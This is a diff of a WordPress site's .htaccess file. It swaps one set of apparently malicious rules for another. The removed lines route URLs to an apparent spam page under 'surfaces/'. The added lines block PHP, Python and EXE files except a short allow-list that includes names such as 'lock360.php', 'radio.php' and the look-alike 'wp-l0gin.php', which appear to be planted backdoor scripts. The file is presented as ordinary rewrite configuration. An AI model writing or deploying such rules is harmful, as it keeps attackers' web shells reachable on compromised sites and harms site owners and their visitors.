@@ -1,22 +1,16 @@
-# BEGIN WordPress
+<FilesMatch ".(py|exe|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /
-RewriteRule ^.*-([0-9]+)/$ surfaces/index.php?id=$1 [L]
-RewriteRule ^.*/.*([0-9]+).htm$ surfaces/index.php?id=$1 [L]
-RewriteRule ^index.php$ - [L]
+RewriteRule ^index\.php$ - [L]
 RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . index.php [L]
-</IfModule>
-# END
-<IfModule mod_alias.c>
-<FilesMatch "\.(py|exe|php)$">
-    Order Allow,Deny
-    Deny from all
-</FilesMatch>
-<FilesMatch "(admin|about|themes|template|widgets|nav-menus|customize|update-core|edit-comments|post-new|media-new|user-new|profile|wp-login|post|options-discussion|site-health|edit|comment|load-styles|load-scripts|ms-module|admin-ajax|edit-tags|erase-personal-data|export|export-personal-data|options-header|import|index|options-general|options-media|options-permalink|options-privacy|options-reading|options-writing|plugin-editor|class-wp-widget-index|plugin-install|plugins|theme-editor|tools|upload|users|ms-loader|xmlrpc|wp-signup|wp-blog|wp-module|wp-log|module)\.php$">
-    Order Allow,Deny
-    Allow from all
-</FilesMatch>
+RewriteRule . /index.php [L]
 </IfModule>
